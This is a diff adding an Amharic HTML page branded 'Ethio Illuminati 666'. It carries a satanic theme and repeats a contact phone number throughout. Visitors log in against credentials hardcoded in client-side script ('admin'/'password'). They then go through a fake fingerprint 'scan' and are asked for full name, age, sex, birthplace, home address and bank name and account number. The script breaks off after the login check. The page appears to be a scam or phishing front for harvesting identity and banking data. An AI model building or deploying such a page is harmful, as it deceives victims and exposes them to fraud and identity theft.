@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+  <meta charset="UTF-8">
+  <title>ኢትዮ ኢሉሚኔት - የጣት ምርመራ አገልግሎት</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Fonts and Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Ethiopic:wght@700&family=UnifrakturCook:wght@700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: radial-gradient(ellipse at 60% 20%, #2b161c 0%, #3b0e13 60%, #110c10 100%);
+      background-size: 180% 180%;
+      animation: satanicGlow 13s ease-in-out infinite;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      color: #fbeeea;
+      overflow-x: hidden;
+    }
+    @keyframes satanicGlow {
+      0%,100% { background-position: 0% 50%; }
+      50% { background-position: 100% 40%; }
+    }
+    .dec666 {
+      font-family: 'UnifrakturCook', 'Noto Sans Ethiopic', serif;
+      font-size: 2.4rem;
+      color: #ff2d6b;
+      letter-spacing: 0.2em;
+      text-shadow: 0 4px 30px #ffae00, 0 2px 7px #d42c2c;
+      user-select: none;
+      opacity: 0.19;
+      position: absolute;
+      pointer-events: none;
+      z-index: 10;
+      animation: swing666 7s ease-in-out infinite alternate;
+    }
+    .dec666.topleft     { top: 12px; left: 18px; transform: rotate(-15deg);}
+    .dec666.topright    { top: 21px; right: 22px; transform: rotate(11deg);}
+    .dec666.bottomleft  { bottom: 18px; left: 10px; transform: rotate(-8deg);}
+    .dec666.bottomright { bottom: 13px; right: 20px; transform: rotate(8deg);}
+    .dec666.center      { top: 48%; left: 50%; transform: translate(-50%,-50%) scale(1.9) rotate(-14deg); opacity:0.09;}
+    .dec666.form        { top: 48px; left: 60%; font-size:1.4rem; opacity:0.12; transform: rotate(12deg);}
+    @keyframes swing666 {
+      0%,100% { filter: blur(0.5px);}
+      50%     { filter: blur(2.4px);}
+    }
+    .myphone {
+      position: fixed;
+      right: 17px;
+      bottom: 29px;
+      z-index: 999;
+      color: #ffae00;
+      font-size: 1.09rem;
+      background: rgba(44,0,8,0.93);
+      border-radius: 22px 2px 22px 22px;
+      box-shadow: 0 2px 18px #ffae0066;
+      padding: 8px 19px 8px 11px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      font-weight: bold;
+      letter-spacing: 0.05em;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      opacity: 0.94;
+      transition: background 0.2s, box-shadow 0.2s;
+      pointer-events: auto;
+      text-decoration: none;
+    }
+    .myphone .fa-phone { color: #ffae00; font-size: 1.08em;}
+    .myphone:hover {
+      background: #d42c2c;
+      color: #fff;
+      box-shadow: 0 4px 20px #ffae00cc;
+    }
+    .main-wrapper {
+      background: rgba(30, 7, 14, 0.98);
+      max-width: 480px;
+      margin: 38px auto;
+      border-radius: 36px;
+      box-shadow: 0 8px 60px #a0101f88, 0 2px 22px #ffae0077;
+      padding: 32px 12px 26px 12px;
+      position: relative;
+      border: 2.5px solid #a91414cc;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .logo-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 18px;
+      position: relative;
+    }
+    .logo-badge {
+      width: 80px;
+      height: 80px;
+      background: radial-gradient(circle at 60% 45%, #d42c2c 40%, #ffae00 90%, #1a0000 100%);
+      border-radius: 50%;
+      box-shadow: 0 0 80px 18px #d42c2c66;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 4px solid #1a0000;
+      margin-bottom: 8px;
+      animation: badgeGlow 3.5s infinite alternate;
+      position: relative;
+      z-index: 2;
+    }
+    .logo-badge .fa-fire {
+      font-size: 2.8rem;
+      color: #ffae00;
+      text-shadow: 0 2px 18px #d42c2c, 0 6px 32px #ffae00;
+      filter: drop-shadow(0 0 23px #ffae0099);
+      animation: iconPulse 2.5s infinite alternate;
+    }
+    .logo-badge .inner666 {
+      position: absolute;
+      left: 50%; top: 59%;
+      transform: translate(-50%,-50%) rotate(-7deg);
+      font-size: 1.9rem;
+      color: #ff2d6b;
+      opacity: 0.44;
+      font-family: 'UnifrakturCook', serif;
+      pointer-events: none;
+      user-select: none;
+      letter-spacing: 0.2em;
+      filter: blur(0.2px);
+    }
+    @keyframes badgeGlow {
+      0%,100% { box-shadow: 0 0 80px 18px #d42c2c66; }
+      50% { box-shadow: 0 0 100px 28px #ff2d6bcc, 0 2px 45px #ffae0099; }
+    }
+    @keyframes iconPulse {
+      0%,100% { transform: scale(1);}
+      60% { transform: scale(1.13);}
+      80% { transform: scale(0.97);}
+    }
+    .logo-title {
+      font-family: 'UnifrakturCook', 'Noto Sans Ethiopic', Arial, sans-serif;
+      font-size: 1.4rem;
+      color: #ff2d6b;
+      letter-spacing: 1.1px;
+      text-shadow: 0 2px 15px #ffae00, 0 2px 7px #fff2;
+      margin-bottom: 2px;
+      margin-top: 1px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+    .logo-title .supersix {font-size:1.05em;color:#d42c2c;text-shadow:0 2px 13px #ffae00;}
+    .logo-tagline {
+      font-size: 1.02rem;
+      color: #ffae00;
+      letter-spacing: 0.09em;
+      text-shadow: 0 2px 7px #ffae00bb;
+      font-weight: 700;
+      margin-bottom: 8px;
+      font-style: italic;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .verified-bar {
+      background: linear-gradient(90deg,#b6410a 0,#ffae00 100%);
+      padding: 7px 19px;
+      border-radius: 20px;
+      margin: 0 auto 14px auto;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      width: fit-content;
+      box-shadow: 0 2px 13px #c8101025;
+      color: #fff;
+      font-weight: bold;
+      font-size: 1.05rem;
+      letter-spacing: 1px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .verified-bar .fa-shield-halved { font-size: 1.05em; color: #fff; }
+    .verified-bar .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      margin-left: 10px;
+      font-weight: 700;
+      text-shadow: 0 1px 10px #ffae0088;
+    }
+    .header {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 10px;
+      gap: 17px;
+    }
+    .flag {
+      width: 85px !important;
+      max-width: 32vw;
+      height: auto;
+      border-radius: 8px;
+      box-shadow: 0 2px 21px #c8101077, 0 2px 21px #ffae0033;
+      border: 2.2px solid #fff;
+      background: #fff;
+    }
+    .text {
+      font-weight: 900;
+      font-size: 1.03rem;
+      color: #ffae00;
+      text-shadow: 0 4px 11px #c81010, 0 2px 8px #1a0000;
+      margin: 0 7px;
+      letter-spacing: 1.1px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+    .text .phone-inline {
+      color: #ffae00;
+      font-size: 0.99em;
+      margin-left: 6px;
+      opacity: 0.88;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .guideline {
+      display: flex;
+      align-items: flex-start;
+      gap: 13px;
+      margin: 16px 0 13px 0;
+      background: rgba(44,0,8,0.17);
+      border-left: 6px solid #ffae00;
+      border-radius: 10px;
+      padding: 10px 13px;
+      font-size: 1.01rem;
+      color: #ffae00;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      box-shadow: 0 2px 10px #ffae0055;
+      position: relative;
+    }
+    .guideline .fa {
+      font-size: 1.5rem;
+      color: #ffae00;
+      margin-top: 2px;
+      min-width: 26px;
+      text-align: center;
+    }
+    .guideline .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 7px;
+      font-weight: 700;
+      opacity:0.85;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .guideline .sixmark {
+      font-family: 'UnifrakturCook', serif;
+      font-size: 1.18em;
+      color: #ff2d6b;
+      margin-left: 7px;
+      opacity:0.5;
+      vertical-align: middle;
+      text-shadow: 0 2px 9px #ffae00;
+    }
+    #login-form {
+      width: 100%; max-width: 320px; margin: 0 auto; text-align: center;
+    }
+    #login-form h2 {
+      color: #ff2d6b;
+      font-size: 1.13rem;
+      margin-bottom: 0.7rem;
+      text-shadow: 0 2px 10px #ffae00bb;
+      font-weight: 700;
+      letter-spacing: 1.1px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      justify-content: center;
+    }
+    #login-form h2 .sixmark {
+      font-size: 1.27em;
+      color: #d42c2c;
+      opacity:0.5;
+      text-shadow: 0 2px 12px #ffae00;
+    }
+    #login-form .phone-inline {
+      color: #ffae00;
+      font-size: 0.96em;
+      margin-left: 6px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    #login-form input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1.5px solid #ff2d6b;
+      border-radius: 7px;
+      background: #3b0e13e6;
+      color: #fff;
+      font-size: 1.05rem;
+      box-shadow: 0 1px 7px #ffae0022 inset;
+      outline: none;
+      transition: border-color 0.2s, background 0.2s;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    #login-form input:focus {
+      border-color: #ffae00;
+      background: #4c181be2;
+    }
+    #login-form button {
+      padding: 11px 0;
+      background: linear-gradient(90deg, #ff2d6b 0%, #ffae00 100%);
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      margin-top: 11px;
+      font-size: 1.07rem;
+      box-shadow: 0 2px 10px #ff2d6b44;
+      transition: transform 0.22s, box-shadow 0.2s;
+      letter-spacing: 0.8px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      justify-content: center;
+    }
+    #login-form button .sixmark {
+      font-size: 1.28em;
+      color: #d42c2c;
+      opacity:0.4;
+      margin-left: 5px;
+      text-shadow: 0 2px 12px #ffae00;
+    }
+    #login-form button .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 5px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    #error-message {
+      color: #ff5555;
+      margin-top: 11px;
+      min-height: 22px;
+      font-weight: 600;
+      text-shadow: 0 1px 7px #ff6b6b22;
+    }
+    #main-content { display: none; width: 100%; }
+    .fp-container { text-align: center; }
+    .fp-title {
+      color: #ffae00;
+      font-size: 1.19rem;
+      font-weight: 900;
+      margin-bottom: 0.5rem;
+      text-shadow: 0 6px 25px #d42c2c66;
+      font-family: 'UnifrakturCook', 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .fp-instructions {
+      color: #ffae00;
+      font-size: 0.98rem;
+      margin-bottom: 1.0rem;
+      text-shadow: 0 2px 9px #ffae0055;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      font-weight: 600;
+    }
+    .fp-instructions .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 7px;
+      font-weight: 700;
+      opacity:0.85;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .fp-svg-wrap {
+      background: linear-gradient(150deg, #3b0e13 45%, #ff2d6b 100%);
+      border-radius: 50%;
+      box-shadow: 0 0 54px 7px #d42c2c33, 0 8px 35px 0 #ffae0011;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 210px;
+      height: 210px;
+      margin: 0 auto 12px;
+      transition: box-shadow 0.3s, background 0.3s, border-color 0.3s;
+      cursor: pointer;
+      position: relative;
+      border: 3.2px solid #ff2d6bcc;
+      outline: none;
+    }
+    .fp-svg-wrap:focus {
+      border-color: #ffae00;
+      box-shadow: 0 0 80px 18px #ffae0033;
+    }
+    .fp-svg {
+      width: 150px;
+      height: 150px;
+      filter: drop-shadow(0 0 15px #d42c2c77);
+      user-select: none;
+      pointer-events: none;
+    }
+    .fp-svg-wrap.active {
+      box-shadow: 0 0 80px 18px #ffae00cc, 0 0 120px 31px #d42c2c99;
+      background: linear-gradient(120deg, #4c181b 0%, #ffae00 94%);
+      border-color: #ffae00;
+    }
+    .fp-success {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      align-items: center;
+      justify-content: center;
+      background: rgba(24,1,2,0.99);
+      border-radius: 50%;
+      z-index: 2;
+      flex-direction: column;
+      animation: popIn 0.5s cubic-bezier(.68,-0.55,.27,1.55);
+      min-height: 210px;
+    }
+    .fp-success.show { display: flex; }
+    .success-circle {
+      width: 74px; height: 74px;
+      background: radial-gradient(circle at 55% 40%, #ffae00 0%, #d42c2c 80%, #1a2a3a 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 10px;
+      box-shadow: 0 0 34px #ffae0099, 0 0 10px #d42c2c55;
+      border: 3px solid #fff;
+      animation: popIn 0.7s cubic-bezier(.68,-0.55,.27,1.55);
+      position: relative;
+    }
+    .success-circle .sixmark {
+      position: absolute;
+      right: 7px; bottom: 7px;
+      font-size: 1.2rem;
+      color: #ff2d6b;
+      opacity: 0.4;
+      pointer-events: none;
+      text-shadow: 0 2px 11px #ffae00;
+    }
+    .success-circle .phone-inline {
+      position: absolute;
+      left: 7px;
+      bottom: 7px;
+      font-size: 0.92rem;
+      color: #ffae00;
+      opacity: 0.7;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .success-icon {
+      font-size: 38px;
+      color: #ffae00;
+      animation: bounce 0.6s;
+      text-shadow: 0 0 20px #d42c2ccc, 0 0 18px #ffae0088;
+    }
+    .success-text {
+      color: #ffae00;
+      font-size: 1.09rem;
+      font-weight: bold;
+      letter-spacing: 1px;
+      text-shadow: 0 0 12px #ffae00aa, 0 0 14px #d42c2c33;
+      margin-top: 2px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .success-desc {
+      color: #fff;
+      font-size: 0.89rem;
+      text-align: center;
+      margin-top: 8px;
+      text-shadow: 0 1px 8px #ffae0077;
+      font-weight: 500;
+      line-height: 1.45;
+    }
+    .success-desc .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 7px;
+      font-weight: 700;
+      opacity:0.85;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .success-code {
+      display: block;
+      color: #ffae00;
+      background: #2b161c;
+      border: 2px solid #ffae00;
+      border-radius: 8px;
+      padding: 5px 7px;
+      font-size: 0.97rem;
+      font-weight: bold;
+      margin: 8px auto 7px auto;
+      box-shadow: 0 2px 13px #ffae0077;
+      letter-spacing: 1px;
+      font-family: 'Noto Sans Ethiopic', monospace;
+      text-align: center;
+      word-break: break-all;
+    }
+    @keyframes popIn { 0% { transform: scale(0.5); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+    @keyframes bounce { 0% { transform: scale(0.3); } 60% { transform: scale(1.2); } 80% { transform: scale(0.95); } 100% { transform: scale(1); } }
+    #user-info-form {
+      width: 100%; max-width: 320px; margin: 12px auto 0 auto; text-align: left;
+      background: rgba(42, 10, 10, 0.80);
+      padding: 10px 7px 10px 7px;
+      border-radius: 10px;
+      box-shadow: 0 2px 12px #d42c2c33;
+      display: none;
+      position: relative;
+    }
+    #user-info-form:before {
+      content: "666";
+      font-family: 'UnifrakturCook', serif;
+      position: absolute;
+      top: 5px; right: 18px;
+      font-size: 1.21rem;
+      color: #ff2d6b;
+      opacity:0.19;
+      pointer-events: none;
+      z-index: 0;
+      text-shadow: 0 2px 11px #ffae00;
+    }
+    #user-info-form .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 7px;
+      font-weight: 700;
+      opacity:0.85;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      display: inline-block;
+    }
+    #user-info-form h2 {
+      color: #ff2d6b;
+      font-size: 1.01rem;
+      margin-bottom: 0.7rem;
+      text-shadow: 0 2px 8px #ffae0033;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    #user-info-form label {
+      color: #ffae00; font-size: 0.95rem;
+      margin-bottom: 0.23rem; display: block; font-weight: 700;
+    }
+    #user-info-form input {
+      width: 100%; padding: 7px; margin-bottom: 0.6rem;
+      border: 1.1px solid #ff2d6b; border-radius: 4px;
+      background: #3b0e13; color: #fff; font-size: 0.97rem;
+      box-shadow: 0 1px 5px #ffae0022 inset; outline: none; transition: border-color 0.18s;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    #user-info-form input:focus {
+      border-color: #ffae00;
+      background: #4c181b;
+    }
+    #user-info-form button {
+      padding: 8px 0; width: 100%;
+      background: linear-gradient(90deg, #d42c2c 0%, #ffae00 100%);
+      color: #fff; border: none; border-radius: 5px;
+      cursor: pointer; font-weight: bold; font-size: 0.91rem;
+      box-shadow: 0 2px 8px #d42c2c55;
+      transition: transform 0.2s, box-shadow 0.2s;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      justify-content: center;
+    }
+    #user-info-form button .sixmark {
+      font-size: 1.13em;
+      color: #d42c2c;
+      opacity:0.5;
+      margin-left: 5px;
+      text-shadow: 0 2px 12px #ffae00;
+    }
+    #user-info-form button .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 5px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    .spinner {
+      display: inline-block; width: 16px; height: 16px;
+      border: 2px solid #ffae00;
+      border-top: 2px solid #d42c2c;
+      border-radius: 50%; animation: spin 0.9s linear infinite;
+      vertical-align: middle;
+      margin-left: 6px;
+    }
+    @keyframes spin {0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);}}
+    .fp-footer {
+      color: #ff2d6b;
+      margin-top: 1.7rem;
+      font-size: 0.96rem;
+      text-shadow: 0 3px 14px #ffae0044;
+      text-align: center;
+      font-weight: 600;
+      letter-spacing: 1px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      position: relative;
+    }
+    .fp-footer .sixmark {
+      font-family: 'UnifrakturCook', serif;
+      font-size: 1.02em;
+      color: #ff2d6b;
+      opacity: 0.34;
+      margin-left: 2px;
+      text-shadow: 0 2px 9px #ffae00;
+    }
+    .fp-footer .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 7px;
+      font-weight: 700;
+      opacity:0.92;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      display:inline-block;
+    }
+    #logoutBtn {
+      margin-top: 16px;
+      padding: 8px 0;
+      width: 100%;
+      background: linear-gradient(90deg, #ffae00 0%, #ff2d6b 100%);
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 0.97rem;
+      box-shadow: 0 2px 10px #ffae0044;
+      transition: background 0.22s, box-shadow 0.2s, transform 0.17s;
+      letter-spacing: 1px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      justify-content: center;
+    }
+    #logoutBtn .sixmark {
+      font-size: 1.13em;
+      color: #d42c2c;
+      opacity:0.5;
+      margin-left: 5px;
+      text-shadow: 0 2px 12px #ffae00;
+    }
+    #logoutBtn .phone-inline {
+      color: #ffae00;
+      font-size: 0.98em;
+      margin-left: 5px;
+      font-family: 'Noto Sans Ethiopic', Arial, sans-serif;
+    }
+    @media (max-width: 480px) {
+      .main-wrapper { padding: 6px 0.5vw; }
+      .logo-badge { width: 43px; height: 43px; }
+      .logo-title { font-size: 0.98rem; }
+      .logo-tagline { font-size: 0.78rem; }
+      .verified-bar { font-size: 0.87rem; }
+      .fp-svg-wrap { width: 58vw; height: 58vw; max-width: 210px; max-height: 210px;}
+      .fp-svg { width: 40vw; height: 40vw; max-width: 150px; max-height: 150px;}
+      .fp-title { font-size: 0.89rem; }
+      .fp-instructions { font-size: 0.74rem; }
+      .success-circle { width: 38px; height: 38px;}
+      .success-icon { font-size: 22px; }
+      .success-text { font-size: 0.78rem;}
+      .success-desc { font-size: 0.67rem;}
+      #login-form input, #user-info-form input { font-size: 0.81rem;}
+      #login-form button, #user-info-form button, #logoutBtn { font-size: 0.79rem;}
+      .flag { width: 21vw !important; max-width: 43px; }
+      .text { font-size: 0.79rem;}
+    }
+  </style>
+</head>
+<body>
+  <!-- 666 Decorative Elements -->
+  <span class="dec666 topleft">666</span>
+  <span class="dec666 topright">666</span>
+  <span class="dec666 bottomleft">666</span>
+  <span class="dec666 bottomright">666</span>
+  <span class="dec666 center">666</span>
+  <!-- Phone floating button -->
+  <a class="myphone" href="tel:0997235723" title="ይደውሉ፡ 0997235723">
+    <i class="fa fa-phone"></i> 0997235723
+  </a>
+  <div class="main-wrapper">
+    <div class="logo-area" aria-label="የኩባንያ አርማ እና ስም">
+      <div class="logo-badge">
+        <i class="fa-solid fa-fire" title="Infernal Verified"></i>
+        <span class="inner666">666</span>
+      </div>
+      <span class="logo-title">ኢትዮ ኢሉምናቲ  <span class="supersix">666</span></span>
+      <span class="logo-tagline">ታማኝ አገልግሎት፣ ለዕውቀትና ለብርሃን ጥሪ። <span class="phone-inline">0997235723</span></span>
+      <div class="verified-bar">
+        <i class="fa-solid fa-shield-halved"></i>
+        የታመነ መድረክ <span class="phone-inline">0997235723</span>
+      </div>
+    </div>
+    <div class="guideline"><i class="fa fa-user-lock"></i>
+      <span><b>መጀመሪያ፦ ይመዝገቡ <span class="sixmark">666</span></b><br>
+        <span style="color:#fff;">መጀመያርያ ውስጥ ለመግባት የሚያስፈልጉትን ስም እና የይለፍ ቃል  ይጻፉ፡፡ ከዚያም ይግቡ። <span class="phone-inline">0997235723</span></span>
+      </span>
+    </div>
+    <div id="login-form">
+      <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/71/Flag_of_Ethiopia.svg/1200px-Flag_of_Ethiopia.svg.png" alt="የኢትዮጵያ ባንዲራ" class="flag">
+        <div class="text">የኢትዮጵያ ኢሉምናቲ አማኞች <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></div>
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/1200px-Flag_of_the_United_States.svg.png" alt="የአሜሪካ ባንዲራ" class="flag">
+      </div>
+      <h2>ግባ <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></h2>
+      <form id="loginForm" autocomplete="off" aria-label="የግባ ቅፅ">
+        <input type="text" id="username" placeholder="የተጠቃሚ ስም" required aria-label="የተጠቃሚ ስም">
+        <input type="password" id="password" placeholder="የይለፍ ቃል" required aria-label="የይለፍ ቃል">
+        <button type="submit">ግባ <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></button>
+      </form>
+      <div id="error-message" aria-live="polite"></div>
+    </div>
+    <div class="guideline"><i class="fa fa-fingerprint"></i>
+      <span><b>የሁለተኛ ደረጃ፦የጣት አሻራ <span class="sixmark">666</span></b><br>
+        <span style="color:#fff;">ጣትዎን የሚያዩት የአሻራ ምልክት ጋር ተጭነው ለ5 ሴኮንድ ይቆዩ። <span class="phone-inline">0997235723</span></span>
+      </span>
+    </div>
+    <div id="main-content">
+      <div class="fp-container">
+        <div class="fp-title">የጣት ማረጋገጫ <span class="sixmark">666</span></div>
+        <div class="fp-instructions" id="fpInstruction">ጣትዎን ስክሪኑ ጋር ተጭነው ይቆዩ። <span class="phone-inline">0997235723</span></div>
+        <div class="fp-svg-wrap" id="fpWrap" aria-label="የጣት ምርመራ" tabindex="0">
+          <svg class="fp-svg" id="fingerprintSVG" viewBox="0 0 200 200" aria-hidden="true">
+            <defs>
+              <linearGradient id="fpGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#ff2d6b" />
+                <stop offset="100%" stop-color="#ffae00" />
+              </linearGradient>
+              <linearGradient id="fpActiveGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#ffae00" />
+                <stop offset="100%" stop-color="#ff2d6b" />
+              </linearGradient>
+            </defs>
+            <g id="fpPaths" stroke="url(#fpGradient)" stroke-width="5" fill="none" stroke-linecap="round">
+              <path d="M100,30a70,70 0 1,1 0,140a70,70 0 1,1 0,-140" />
+              <path d="M100,45a55,55 0 1,1 0,110a55,55 0 1,1 0,-110" />
+              <path d="M100,60a40,40 0 1,1 0,80a40,40 0 1,1 0,-80" />
+              <path d="M100,75a25,25 0 1,1 0,50a25,25 0 1,1 0,-50" />
+              <path d="M100,90a10,10 0 1,1 0,20a10,10 0 1,1 0,-20" />
+            </g>
+          </svg>
+          <div class="fp-success" id="fpSuccess" aria-live="polite">
+            <div class="success-circle">
+              <i class="fa-solid fa-fire success-icon"></i>
+              <span class="sixmark">666</span>
+              <span class="phone-inline">0997235723</span>
+            </div>
+            <span class="success-text" id="successText">የጣት አሻራው ተጠናቋል! <span class="sixmark">666</span></span>
+            <span class="success-desc" id="successDesc">እንኳን ወደ ኢትዮ ኢሉምናቲ በደህና መጡ!<br>አገልግሎት በደህና ይጠቀሙ። <span class="phone-inline">0997235723</span></span>
+            <span class="success-code" id="successCode"></span>
+          </div>
+        </div>
+      </div>
+      <div class="guideline"><i class="fa fa-address-card"></i>
+        <span><b>የሶስተኛ ደረጃ፦ የግል መረጃ <span class="sixmark">666</span></b><br>
+          <span style="color:#fff;">ቦታዎቹን በትክክል ይሙሉ፡፡ መረጃውን ከሞሉ በኋላ ይላኩ። <span class="phone-inline">0997235723</span></span>
+        </span>
+      </div>
+      <div id="user-info-form">
+        <h2>የተጠቃሚ መረጃ <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></h2>
+        <form id="infoForm" aria-label="የተጠቃሚ መረጃ ቅፅ">
+          <input type="hidden" value="666" />
+          <label for="fullName">ሙሉ ስም:</label>
+          <input type="text" id="fullName" name="ሙሉ ስም" required>
+          <label for="age">ዕድሜ:</label>
+          <input type="number" id="age" name="ዕድሜ" required>
+          <label for="sex">ጾታ:</label>
+          <input type="text" id="sex" name="ጾታ" required>
+          <label for="birthPlace">የትውልድ ቦታ:</label>
+          <input type="text" id="birthPlace" name="የትውልድ ቦታ" required>
+          <label for="birthDate">የትውልድ ቀን:</label>
+          <input type="text" id="birthDate" name="የትውልድ ቀን" required>
+          <label for="region">ክልል:</label>
+          <input type="text" id="region" name="ክልል" required>
+          <label for="zone">ዞን:</label>
+          <input type="text" id="zone" name="ዞን" required>
+          <label for="woreda">ወረዳ:</label>
+          <input type="text" id="woreda" name="ወረዳ" required>
+          <label for="kebele">ቀበሌ:</label>
+          <input type="text" id="kebele" name="ቀበሌ" required>
+          <label for="sefer">ሰፈር:</label>
+          <input type="text" id="sefer" name="ሰፈር" required>
+          <label for="bankName">የባንክ ስም:</label>
+          <input type="text" id="bankName" name="የባንክ ስም" required>
+          <label for="bankAccount">የባንክ አካውንት ቁጥር:</label>
+          <input type="text" id="bankAccount" name="የባንክ አካውንት ቁጥር" required>
+          <button type="submit" id="submitUserInfoBtn">ይላኩ <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></button>
+          <span id="userInfoSpinner" style="display:none;"><span class="spinner"></span></span>
+        </form>
+        <div class="phone-inline">ስልክ: 0997235723</div>
+      </div>
+      <div class="guideline"><i class="fa fa-check-circle"></i>
+        <span><b>የአራተኛ ደረጃ፦ አስደናቂ ውጤት! <span class="sixmark">666</span></b><br>
+          <span style="color:#fff;">መረጃዎ በተሳካ ሁኔታ ከተላከ በኋላ ስምዎን እና የበለይ መለያዎን በድምብ ይመልከቱ። <span class="phone-inline">0997235723</span></span>
+        </span>
+      </div>
+      <div class="fp-footer" aria-label="የኮፒራይት እና ማስረጃ">
+        በኢትዮ ኢሉሚኔት የተሰራ © 2025 <span class="sixmark">666</span>
+        <span class="phone-inline">0997235723</span><br>
+        <span style="font-size:1.09em; color:#ffae00; opacity:0.96;">አስተማማኝ ። ምርጥ አገልግሎት፣ የሳይጣን ብርሃን።</span>
+      </div>
+      <button id="logoutBtn" aria-label="ውጣ">ውጣ <span class="sixmark">666</span> <span class="phone-inline">0997235723</span></button>
+    </div>
+  </div>
+  <span class="dec666 form">666</span>
+  <!-- Sound Effects -->
+  <audio id="holdSound" preload="auto">
+    <source src="https://cdn.pixabay.com/audio/2022/10/16/audio_12b3c1e2c5.mp3" type="audio/mp3">
+  </audio>
+  <audio id="completeSound" preload="auto">
+    <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_115b9b7e3a.mp3" type="audio/mp3">
+  </audio>
+  <script>
+    // Login/Logout logic
+    const loginForm = document.getElementById('loginForm');
+    const errorMessage = document.getElementById('error-message');
+    const mainContent = document.getElementById('main-content');
+    const logoutBtn = document.getElementById('logoutBtn');
+    const fingerprintSVG = document.getElementById('fingerprintSVG');
+    const fpPaths = document.getElementById('fpPaths');
+    const fpWrap = document.getElementById('fpWrap');
+    const fpSuccess = document.getElementById('fpSuccess');
+    const fpInstruction = document.getElementById('fpInstruction');
+    const holdSound = document.getElementById('holdSound');
+    const completeSound = document.getElementById('completeSound');
+    let animating = false;
+    let animationFrame;
+    let hue = 0;
+    let holdTimeout = null;
+    let scanCompleted = false;
+
+    holdSound.volume = 0.18;
+    completeSound.volume = 0.70;
+
+    loginForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value;
+      if (username === 'admin' && password === 'password') {
+        document.getElementById('login-form').style.display = 'none';
